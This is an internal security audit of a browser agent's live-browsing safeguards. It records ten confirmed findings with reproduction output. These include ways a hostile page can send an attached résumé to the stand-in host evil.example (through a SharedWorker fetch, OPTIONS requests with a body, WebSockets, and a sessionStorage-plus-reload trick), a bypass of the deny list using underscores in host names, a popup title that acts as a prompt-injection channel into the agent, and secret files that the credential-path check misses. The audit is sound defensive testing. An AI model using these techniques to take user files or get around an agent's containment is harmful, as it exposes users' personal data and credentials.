# Adversary review, round 3

- Date: 2026-10-08
- Round: 3 (a code round: S2 LIVE mode)
- Targets: `src/allowances.ts`, `src/net-gate.ts`, `src/browser-policy.ts`, `src/browser-tools.ts` (LIVE policy, landing, upload hold, upload tool), `src/profile.ts`, `src/login.ts`, `src/uploads.ts`, `src/path-canon.ts`, `src/hooks.ts`, `src/bash-analysis.ts`. Claims checked: `docs/IMPROVEMENTS.md` IMP-026 to IMP-029, `docs/BROWSER-AGENT.md` sections 4, 4d, 7, `docs/HYBRID-AGENT-THREATS.md` rows C3, C4, D1 to D6, B7, B12.
- Ground truth read: `docs/HANDOFF.md`, `docs/HYBRID-AGENT-THREATS.md`, `docs/BROWSER-AGENT.md`, `docs/IMPROVEMENTS.md` (IMP-026 to IMP-029), `docs/adversary/round-02.md` (format and history only), then the code above, `test/live-browser.mjs`, `test/upload-form.mjs` (as the model for the harness), `bench/adversary.mjs`.
- What I ran: a scratch worktree of `393dda5` at `/tmp/r3-wt` (`npm run build`, `node_modules` symlinked) for everything in the browser, gate, allowances, profile and upload code, and a second one of `423d2e8` (HEAD when I checked; it only adds IMP-030 to `bash-analysis`, `hooks`, `path-canon`) for the shell and file-hook checks; both removed at the end, so a reproduction script needs the worktree re-created at the path its first import names, scratch scripts under `/tmp/r3-scratch/`, a shared harness (`lib.mjs`) that builds a fake internet on 127.0.0.1 (one server answering for several `.example` names, counting what reaches each, a resolver stand-in and an `isPublic` stand-in exactly as `test/live-browser.mjs` does) and drives the real handlers (`__testHandlers`) of a `BrowserSessionManager` built with `liveBrowserPolicy(...)` in a real Chromium (the sandbox's `chromium-1194`). The repository's source and tests were not edited. Nothing was pushed or committed. No real third-party host was contacted. The made-up résumé file holds the text `RESUME-BYTES-77`.
- Platform note: Linux only (kernel 6.18, Node 22). Anything about Windows or macOS is argued from the code and says so.
- Triage: this file has no `round-03-triage.md` yet, so `test/adversary-round.mjs` will report every finding as "not triaged" until the maintainers triage it.

## Findings table

| id | severity | status | title |
|----|----------|--------|-------|
| A52 | high | CONFIRMED (run) | The upload hold does not cover a SharedWorker: a hostile page on the employer's site posts the attached résumé to an unlisted host and the network rule never sees it as held |
| A53 | high | CONFIRMED (run) | The upload hold treats OPTIONS as a plain read, and fetch/XHR can send a body with OPTIONS: the whole file goes to an unlisted host |
| A54 | high | CONFIRMED (run) | While a file is attached, a WebSocket to another LISTED platform (or any listed host) carries it: the hold only looks at route() requests, and the WebSocket guard asks "is the host listed", not "is it this page's platform" |
| A55 | medium | CONFIRMED (run) | The hold ends at the next document, and the page can keep the file's bytes across it (sessionStorage/IndexedDB plus a reload): the file leaves a moment later with nothing held |
| A56 | medium | CONFIRMED (run) | A WebSocket opened from a Worker or SharedWorker reaches an unlisted host: "LIVE WebSockets go only to listed names" holds for the page's own thread only |
| A57 | medium | CONFIRMED (run) | The deny list is fail-open for any host name the normaliser cannot parse: x_y.ads.example is "unlisted", not "denied", and the gate lets it through |
| A58 | medium | CONFIRMED (run) | A popup that a redirect carries off the list is never blanked and never reported: list_tabs and switch_tab print its attacker-chosen title and URL, and the live page keeps running |
| A59 | low | CONFIRMED (run) | The profile lock is stale-recovered by a process in another PID namespace: a sandboxed run and a host run both take the same profile |
| A60 | low | CONFIRMED (run) | The credential-path list lets ordinary secret files through the Read hook and the read-only shell check: .envrc, .env-prod, .htpasswd, terraform.tfstate, *.tfvars, kubeconfig, .config/gh/hosts.yml, *.jks, *.p8, .vault_pass, .bash_history |
| A61 | low | CONFIRMED by text | LIVE mode opens and talks plain http to listed hosts: the profile's non-Secure cookies travel in clear and a network attacker can write the page the agent reads |
<!-- table-end -->

## Findings

<!-- findings-start -->

### A52 (high) The upload hold does not cover a SharedWorker: a hostile page on the employer's site posts the attached résumé to an unlisted host and the network rule never sees it as held

- **Claim attacked:** IMP-029 and threat B12: "while a file is attached on a page, the context-level request guard holds that tab's requests that are not plain reads (and those of a window the page opened) to `destination` ... a script's `fetch` ... stopped on the network"; S2-REDTEAM "Upload, after the check: 0 reach the other site".
- **Where:** `src/browser-tools.ts` `uploadHeldFor` (about line 536): it maps a request to a tab through `req.frame().page()`, and returns `undefined` for a request with no frame ("a service worker's"). A SharedWorker's requests have no frame either. A dedicated Worker does have one (its owner), so it is held.
- **Reproduction (run, `/tmp/r3-scratch/e2-upload-hold.mjs`, real Chromium, LIVE policy, `jobs.example` listed, `evil.example` not listed, résumé file holds `RESUME-BYTES-77`):** the form page creates `new Worker`, `new SharedWorker`, a BroadcastChannel and a `noopener` popup at load; on the field's `change` event it hands the `File` to each, and each worker does `fetch("http://evil.example/...", {method:"POST", mode:"no-cors", body})`. Then the agent calls the `upload` tool.
  ```
  upload -> Attached "resume" (resume.pdf, 1 KB) to #cv. Its form sends to jobs.example:44575. The file is sent when the form is submitted.
  via-page-itself        blocked / not received
  via-dedicated-worker   blocked / not received
  via-shared-worker      REACHED evil.example: POST len=33 resume-bytes=true
  via-noopener-popup     blocked / not received
  notices shown to agent: [... "blocked by the upload rule: evil.example:44575/via-page-itself ...", "...via-dedicated-worker ...", "...via-noopener-popup ..."]
  ```
  The far side counted the POST with the résumé bytes. The agent was told nothing about the shared-worker one.
- **Impact:** the one action in S2 that moves the user's own data out has an enforcement ("the network rule is what holds") that a page script defeats with a `SharedWorker`, which is 3 lines. The page needs only to be a script on a listed site (the B12 attacker: "the input is swapped", a compromised or hostile employer page, an XSS on a tenant). The résumé (name, address, phone) goes to any public host.
- **Suggested fix:** when a request has no frame (a worker that is not a dedicated worker), treat it as belonging to every tab that has an attached file (fail closed): `uploadHeldFor` returns the first tab with `upload` set. Better, hold by `route.request().serviceWorker()`/worker origin as well, or disable SharedWorker with an init script and refuse requests with no frame while any tab holds a file. Add a SharedWorker case to `test/upload-form.mjs` (4).

### A53 (high) The upload hold treats OPTIONS as a plain read, and fetch/XHR can send a body with OPTIONS: the whole file goes to an unlisted host

- **Claim attacked:** same as A52; "nothing but a plain read may leave that page for another site" and the cost line "a listed page can still send a small GET".
- **Where:** `src/browser-tools.ts` `isPlainRead`: `method === "GET" || "HEAD" || "OPTIONS"`. `GET` and `HEAD` cannot carry a body in fetch/XHR, but `OPTIONS` can (`fetch(url, {method:"OPTIONS", body: file})`, `xhr.open("OPTIONS", url); xhr.send(file)`). A cross-origin one first sends a body-less CORS preflight to the far side, which the far side (the attacker) simply approves.
- **Reproduction (run, `/tmp/r3-scratch/t2-options.mjs`):** attach with the `upload` tool, then the page's `change` handler does the following to `evil.example` (unlisted; the far server answers the preflight with `access-control-allow-methods: OPTIONS, PATCH, GET`):
  ```
  Attached "resume" (resume.pdf, 1 KB) to #cv. Its form sends to jobs.example:45963. ...
  evil.example got: OPTIONS /via-options-fetch len=33 resume-bytes-in-body=true resume-in-url=false
  evil.example got: GET /via-get-query?d=%25PDF-1.4%20RESUME-BYTES-77%20a%20resume len=0 ... resume-in-url=true     (documented, D1)
  evil.example got: OPTIONS /via-options-xhr len=33 resume-bytes-in-body=true resume-in-url=false
  ```
  In the same run `PATCH` with a body and `sendBeacon` (POST) did not arrive (held).
- **Impact:** a full-size file body (the GET route is capped near 2 MB of URL and is documented; this one is not) leaves to any public host while the tool tells the agent the file "goes only to jobs.example". It is the documented "small GET" turned into an unbounded POST-equivalent.
- **Suggested fix:** a plain read is `GET` or `HEAD` **with no body**: check `req.postDataBuffer()`/`req.postData()` is empty, and treat `OPTIONS` that carries a body, or any request with a body, as not a read. Safer: hold everything except GET and HEAD, and for GET/HEAD cap the URL length.

### A54 (high) While a file is attached, a WebSocket to another LISTED platform (or any listed host) carries it: the hold only looks at route() requests, and the WebSocket guard asks "is the host listed", not "is it this page's platform"

- **Claim attacked:** B12 "the file goes only to the page's own site", IMP-029 "LIVE: a host on the allowances list in the same platform as the page"; the test only tries an unlisted host (`upload-form` 4).
- **Where:** `src/browser-tools.ts` `routeWebSocket((url) => !policy.allowWebSocket(url.href), ...)`: a socket to a listed host is not matched, so it is native and never reaches `uploadHeldFor`; `liveBrowserPolicy.allowWebSocket` is `hostStatus(a, hostname) === "allowed"` and has no notion of platform.
- **Reproduction (run, `/tmp/r3-scratch/e2c-ws-other-platform.mjs`):** the allowances list is `jobs.example` (platform `jobs`) and `ats.example` (its own platform); the form is on `jobs.example`; after the `upload` tool attaches, the page does `new WebSocket("ws://ats.example/...")` and `send(await f.text())`.
  ```
  Attached "resume" (resume.pdf, 1 KB) to #cv. Its form sends to jobs.example:40737. ...
  ats.example (another LISTED platform) received: ["UPGRADE /other-listed-platform resume-bytes=false","WSMSG /other-listed-platform resume-bytes=true"]
  ```
- **Impact:** the user's list names several platforms (LinkedIn, Workday, a company career site). A script on one of them sends the résumé to any other one, or to a listed host the page does not belong to, over a channel the notice system never mentions (no "blocked" notice, no hold). This is exactly the "another listed platform" case S2-REDTEAM says is covered for forms.
- **Suggested fix:** while a tab holds a file, route all WebSockets of that tab (and its workers, A52) through the same `destination` check (use `routeWebSocket` with a predicate that is true when any tab holds a file), or close WebSockets opened after attach.

### A55 (medium) The hold ends at the next document, and the page can keep the file's bytes across it (sessionStorage/IndexedDB plus a reload): the file leaves a moment later with nothing held

- **Claim attacked:** B12 "the check is repeated ... on the network while the file is attached"; IMP-029 "The hold ends when a new document has loaded in the tab".
- **Where:** `adoptPage`: `page.on("domcontentloaded", () => { tab.upload = undefined; })`. The attached `File` is readable by the page's scripts (FileReader), the page stores the bytes and reloads itself (`location.reload()`); the new document runs with no hold and sends them. IMP-029's cost line admits the page can read the file, but the stated enforcement is "the file goes only to the page's own site".
- **Reproduction (run, `/tmp/r3-scratch/e2b-reload.mjs`):** the `change` handler reads the file with `FileReader.readAsDataURL`, writes it to `sessionStorage`, and reloads after 1.2 s; the reloaded document POSTs the stash to `evil.example`.
  ```
  upload -> Attached "resume" (resume.pdf, 1 KB) to #cv. Its form sends to jobs.example:41249. ...
  notices: []
  after-reload POST to evil.example: POST len=72 decoded body: "%PDF-1.4 RESUME-BYTES-77 a resume"
  ```
  No notice at all. (A script can do the same without a reload if it only needs to wait for a `domcontentloaded` in an iframe or a popup it navigates: the hold is per tab, ended by that tab's main-frame event.)
- **Impact:** the hold is a delay, not a barrier. Together with A52 to A54 the "network rule holds, the page-side check is advisory" claim is not true for a hostile page.
- **Suggested fix:** keep the hold for the whole tab session once a file is attached (until the agent clears the field or the origin changes), or after a new document in the same origin keep refusing non-reads to other platforms for the rest of the run; state in B12 that a page which can read the file can keep it.

### A56 (medium) A WebSocket opened from a Worker or SharedWorker reaches an unlisted host: "LIVE WebSockets go only to listed names" holds for the page's own thread only

- **Claim attacked:** threat D3 "LIVE WebSockets go only to listed names (IMP-027)"; S2-REDTEAM "a WebSocket to an unlisted host: aborted before any request"; `BROWSER-AGENT` 4d.
- **Where:** `context.routeWebSocket` in `getOrCreate`. Playwright's context-level WebSocket routing does not see sockets created in dedicated or shared workers; the gate (which lets any public non-denied host through) then tunnels them.
- **Reproduction (run, `/tmp/r3-scratch/e1-ws-worker.mjs`):** `evil.example` is not on the list. A control opens the socket on the page's main thread, then a page creates `new Worker` and `new SharedWorker` whose scripts open `new WebSocket("ws://evil.example/...")`.
  ```
  main-thread WS control   -> []
  workers                   -> ["UPGRADE /shared-worker-ws","UPGRADE /dedicated-worker-ws","POST /shared-worker-post","POST /dedicated-worker-post"]
  agent was shown: ["Opened http://jobs.example:39235/workers in t1. Title: workers"]
  ```
  The main-thread attempt never connects, both worker ones do, and the agent is told nothing.
- **Impact:** the rule that says a script may not hold a live channel to a host the user did not list is bypassed by two lines. The practical harm is bounded by D1 (the same script can already `fetch` any public host), so this is a false claim and a hole in the audit trail more than a new capability; it matters with A52/A54 where the channel carries the file.
- **Suggested fix:** state it in D3 and the S2 matrix, or close it: an init script that removes `Worker`/`SharedWorker` in LIVE mode, or `--disable-features` for worker WebSockets; or have the gate refuse an `Upgrade` request whose host is not listed (the gate has the allowances, `livePolicy.allowHost` needs a `webSocket` flag) -- the gate sees `upgrade` and CONNECT tunnels for every origin including workers.

### A57 (medium) The deny list is fail-open for any host name the normaliser cannot parse: x_y.ads.example is "unlisted", not "denied", and the gate lets it through

- **Claim attacked:** IMP-026 "its deny list beats any grant", `src/allowances.ts` header; HYBRID-AGENT-THREATS D1/D2 and `docs/S2-REDTEAM.md` "denied host's subresource is not fetched" (`live-browser` 7 tests only `ads.example` itself).
- **Where:** `normalizeHost` returns `undefined` for anything that fails `HOST_RE` (`[a-z0-9-]` labels), so an underscore, `!`, `$`, `,`, `'`, `*` or an empty label makes `hostStatus` return `"unlisted"`; `livePolicy.allowHost` is `hostStatus(a, host) !== "denied"`, i.e. everything that is not provably denied is let through. Chromium sends such names (an underscore in a label is ordinary DNS), and a wildcard record answers for them.
- **Reproduction (run):** `/tmp/r3-scratch/t3-deny.mjs` (unit) and `/tmp/r3-scratch/t3b-deny-browser.mjs` (real Chromium through the real gate). `deny: ["ads.example"]`, `allow: ["jobs.example"]`; the listed page contains five `<img>` tags.
  ```
  "x.ads.example"          normalize: x.ads.example   status: denied    gate allowHost: false
  "x_y.ads.example"        normalize: undefined       status: unlisted  gate allowHost: true
  "_dmarc.ads.example"     normalize: undefined       status: unlisted  gate allowHost: true
  "a!b.ads.example" / "x$.ads.example" / "x,y.ads.example" / "ads.example.."  -> unlisted, allowHost true

  reached jobs.example ["/ (Host: jobs.example:42579)"]
  reached x_y.ads.example ["/underscore.png (Host: x_y.ads.example:42579)"]
  reached _t.ads.example ["/underscore2.png (Host: _t.ads.example:42579)"]
  gate denied: ["ads.example","ads.example.","sub.ads.example"]
  ```
  `ads.example`, `ADS.example.` and `sub.ads.example` were refused; the two underscore names reached the far side.
- **Impact:** a tracker or ad host the user denied (or a site they denied outright, such as a competitor of the employer) is reachable from a listed page by one underscore in a label, for images, scripts, `fetch` and (if the wildcard host is listed otherwise) anything else subresource-shaped. The navigation rule is not affected (an unparsable name is "not on the list" there, which is the safe direction).
- **Suggested fix:** make the deny side fail closed: in `allowHost`, if the name cannot be normalised, compare the raw lower-cased name (trailing dots stripped) against each deny rule by suffix (`host === r.host || host.endsWith("." + r.host)`) and refuse; or refuse every host that `normalizeHost` rejects when it is a name (not an address) in LIVE mode. Add the underscore, `!`, double-dot rows to `bench/suites/live-gate.mjs`.

### A58 (medium) A popup that a redirect carries off the list is never blanked and never reported: list_tabs and switch_tab print its attacker-chosen title and URL, and the live page keeps running

- **Claim attacked:** IMP-027 and `docs/S2-REDTEAM.md` "Redirects ... the page is blanked and none of its text or title reaches the agent"; threat C4/D1 "an off-list redirect ... shows it nothing".
- **Where:** `adoptPage` (`src/browser-tools.ts` ~509) registers the `framenavigated` landing check when the `context.on("page")` event arrives. A popup opened with a URL (`window.open('/r')`) has already committed its redirect target by the time Playwright reports the page, so the one event that would blank it has fired before the listener exists. `activeTab()` still refuses to read it (so `inspect`, `text`, `screenshot` say "not shown"), but `list_tabs` prints `pageTitle(t.page)` and `t.page.url()` for every tab without asking `policy.landing`, and `switch_tab` prints the URL.
- **Reproduction (run, `/tmp/r3-scratch/t9-popup-landing.mjs`, LIVE policy, `jobs.example` listed):** a listed page has a button `onclick="window.open('/r')"`; `/r` answers 302 to `http://evil.example/stall` (unlisted; a page with title `EVIL-TITLE-STALL` whose body stalls). The agent clicks, then calls `list_tabs` repeatedly, waits 7 s, calls `switch_tab`:
  ```
  t+150ms list_tabs: 2 tab(s) open: | t1 (active) "pop" http://jobs.example:44695/pop | t2 "EVIL-TITLE-STALL" http://evil.example:44695/stall
  t+750ms list_tabs: ... t2 "EVIL-TITLE-STALL" http://evil.example:44695/stall
  after 7s list_tabs: ... t2 "EVIL-TITLE-STALL" http://evil.example:44695/stall
  switch_tab -> Switched to t2: http://evil.example:44695/stall. Call inspect or screenshot to act on it.
  inspect -> Error: The tab is on evil.example:44695/stall, which the agent is not shown ...
  notices mentioning landing/blocked: []
  ```
  The same redirect in the main tab (`test/live-browser.mjs` 4) is blanked and noticed; here no blank page, no notice, and the title and URL (query string included, 200 characters) reach the model.
- **Impact:** the "nothing from the page reaches the agent" promise has a hole of 80 characters of attacker text (title) plus a URL per popup, which is a prompt-injection channel in the one place the S2 design says is closed; the off-list document also stays loaded and live. Harm is bounded because the other tools refuse the tab.
- **Suggested fix:** run the landing check once when a page is adopted (`policy.landing(page.url())` and for each existing frame), and make `list_tabs`/`switch_tab` print `(not shown: off the list)` instead of the title and URL for any tab `policy.landing` refuses; add a popup-through-redirect case to `live-browser` (4).

### A59 (low) The profile lock is stale-recovered by a process in another PID namespace: a sandboxed run and a host run both take the same profile

- **Claim attacked:** D4 "exactly one holder at a time ... a live or unprovable holder is never displaced"; IMP-028 "a pid that is alive but whose start time differs is a different process".
- **Where:** `acquireProfileLock` decides a lock is stale when `!alive(holder.pid)` or when the pid is alive with a different start time, and compares `holder.host` (the hostname) only. A process in a PID namespace (a container, `bwrap`, `unshare --pid`) that shares the home directory (bind mount) and the hostname writes a pid that means nothing in the other namespace: there it is another process (or none), so the lock reads as stale.
- **Reproduction (run, Linux, `/tmp/r3-scratch/t7-holder.mjs`, which calls the real `acquireProfileLock`):**
  ```
  $ unshare --pid --fork --mount-proc node t7-holder.mjs /tmp/r3-lock/x.lock pid-namespace 8000 &
  holder in pid-namespace pid 1 -> HELD
  $ cat /tmp/r3-lock/x.lock
  {"pid":1,"start":"c7640ab7-...:73051","host":"vm","nonce":"681652e8...","since":"2026-10-08T05:59:34.478Z"}
  $ node t7-holder.mjs /tmp/r3-lock/x.lock host-namespace 1000
  holder in host-namespace pid 22128 -> HELD
  ```
  Both hold the lock at once (pid 1 on the host is init, alive, with a different start time, so it was judged "a different process now").
- **Impact:** two Chromiums on one profile (the corruption case D4 exists for), and a sandboxed agent run next to `agent-loop login` on the host. Needs a PID namespace plus a shared home, so rare; the fix is cheap.
- **Suggested fix:** record the PID namespace (`readlink /proc/self/ns/pid`) and the mount namespace's boot id in the holder file and treat a different namespace as "held, cannot prove stale" (like another computer); or take an `flock`/`O_EXCL` on a file that the kernel releases when the holder dies, which needs no pid at all.

### A60 (low) The credential-path list lets ordinary secret files through the Read hook and the read-only shell check: .envrc, .env-prod, .htpasswd, terraform.tfstate, *.tfvars, kubeconfig, .config/gh/hosts.yml, *.jks, *.p8, .vault_pass, .bash_history

- **Claim attacked:** IMP-010/IMP-030 "the file tools refuse `.env`, key files, `.git` and `.agent-loop/...` wherever they are" and "a shell command that names a credential file asks"; round 2 A29 (the list is exact-name).
- **Where:** `SENSITIVE_PATH_RE` in `src/path-canon.ts`. `\.env(\.(?!example|...)[^/\\]+)?$` needs a dot after `.env`, so `.envrc`, `.env-prod`, `.env_local` do not match; there is no entry for the other files above.
- **Reproduction (run on `423d2e8`, `/tmp/r3-scratch/t6b-sens.mjs`, real `createSensitiveFileHook` and `approvalPlan` over a temp directory containing each file):**
  ```
  .env                 Read-hook: DENY   cat: asks
  .env.local           Read-hook: DENY   cat: asks
  .envrc               Read-hook: allow  cat: RUNS WITHOUT PROMPT
  .env-prod            Read-hook: allow  cat: RUNS WITHOUT PROMPT
  .htpasswd / terraform.tfstate / prod.tfvars / kubeconfig / gcp-key.json / .vault_pass / .bash_history / keystore.jks / AuthKey_ABC.p8 / .config/gh/hosts.yml / .aws/config : allow, RUNS WITHOUT PROMPT
  ```
  (On 393dda5 `cat .env` itself runs without a prompt; IMP-030 fixes exactly that, and this table is the same on both for the other names.)
- **Impact:** a project that keeps its secrets in a direnv file or a Terraform state hands them to an agent that is told by a page to read them. The hole is the shape of the list, not of the mechanism.
- **Suggested fix:** add `\.env[^/\\]*` (minus the template suffixes), `\.envrc`, `\.htpasswd`, `\.(tfstate|tfvars)(\.backup)?`, `kubeconfig`, `hosts\.yml` under `.config/gh`, `\.(jks|keystore|p8|kdbx)`, `\.[a-z]*_?history`; or invert it: in the sensitive check treat any file whose first bytes look like `KEY=` pairs with a secret-looking name as sensitive.

### A61 (low) LIVE mode opens and talks plain http to listed hosts: the profile's non-Secure cookies travel in clear and a network attacker can write the page the agent reads

- **Claim attacked:** IMP-028 "a logged-in session is a credential" and D5/D6 (the session stays in the profile); `navigationVerdict` is described as "http and https".
- **Where:** `navigationVerdict` accepts `http:` and port 80 for any listed name (`src/allowances.ts`); `liveBrowserPolicy.allowRequest` then lets the request through; the gate connects directly. Nothing upgrades to https or refuses downgrades, and a page on a listed https site can link or redirect to `http://listed-host/...`.
- **Reproduction (run, `/tmp/r3-scratch/t12-hosts.mjs`, policy only):** `checkOpen("http://jobs.example/")` and `checkOpen("http://jobs.example:0080/")` answer ok; `landing("http://jobs.example/")` is ok. A hostile network position (a café router, a hotel) sees the request and any cookie without the `Secure` flag for that host, and can answer with a page whose text the agent will read and act on (the prompt-injection channel the notices block warns about).
- **Impact:** weakens the "only where the list says" promise to "only where the list says, or whoever sits on the path". The profile may hold a session for the site; HSTS-preloaded sites are upgraded by Chromium itself, small employer sites and ATS tenants are not.
- **Suggested fix:** in LIVE mode refuse `http:` navigations (and ws:) to listed hosts unless the rule opts in (`=host` with an `http` marker), or have the gate answer plain http for a listed name with a redirect to https.

## What I tried that held

- Loopback and link-local subresources in LIVE mode: `fetch`/`img` to `127.0.0.2`, `localhost`, `[::1]` and `169.254.169.254` from a listed page. Chromium's implicit proxy bypass did not apply (the gate saw and refused all five; the decoy on 127.0.0.2 received 0). `/tmp/r3-scratch/t1-loopback.mjs`.
- WebTransport to a UDP sink: 0 packets arrived through the session, while the same page in a Chromium without the proxy delivered 4 (`e5-webtransport.mjs`, `e5b-control.mjs`).
- The upload hold against the page's own `fetch`, a dedicated Worker, a `noopener` popup that talks over BroadcastChannel, `PATCH` with a body and `sendBeacon`: all blocked and noticed.
- WebRTC: `RTCPeerConnection` was absent in the page, a fresh iframe read synchronously, a sandboxed iframe, `<object>`, a `window.open("")` and `window.open("about:blank")` popup, an iframe after `document.write`, an iframe loaded over http, a frameset frame, and a `srcdoc` frame; 0 STUN packets at a UDP sink (`t4-webrtc.mjs`).
- Frames and objects to an unlisted host: `<iframe>`, `<object type=text/html>` and `<embed>` were aborted at the first hop, 0 requests, no text shown (`t5-object.mjs`). A listed page opened as a popup whose iframe redirects off the list: the frame was blanked, nothing shown (`t10-popup-frame.mjs`).
- A main-tab redirect to an unlisted page that vetoes unloading with `beforeunload`: blanked anyway (no user activation, so no dialog), list_tabs and inspect show an empty tab (`t8-beforeunload.mjs`).
- Odd host spellings through the LIVE policy (51 URLs, `t12-hosts.mjs`): percent-encoded dots, userinfo tricks (`@`, `#@`, `?@`, `:80@`), backslash, ideographic and fullwidth dots, soft hyphen, zero-width space, homoglyphs, trailing and double dots, IPv4 shorthand, hex, decimal, IPv6, mapped IPv6, a zone id, `localtest.me`, `*.localhost`, `blob:`, `javascript:`, `view-source:`, `ftp:`: each judged the way Chromium reads it (the lookalikes refused; `jobs.example\@evil.com` opens `jobs.example`, which is what Chromium does with a backslash). Only the underscore and similar names (A57) fell on the wrong side, and only for the deny list.
- The address rule (`isPublicAddress`) read against the IANA special-purpose registries for IPv4 and IPv6, including mapped, NAT64, 6to4, Teredo, documentation and `64:ff9b:1::/48`: no gap found by reading; the gate connects to the address it checked (no second lookup).
- Path scope and the sensitive-file hook: `.ENV`, `x/../.env`, a trailing slash, `.git/config`, `.agent-loop/profiles/...` are denied; a `cat` of any of them asks on `423d2e8` (it ran without a prompt on `393dda5`, which IMP-030 documents).
- A pre-registered service worker (made during `agent-loop login`) could not be tried: service workers need a secure context and the fixture is plain http, so that case is untested, not held.
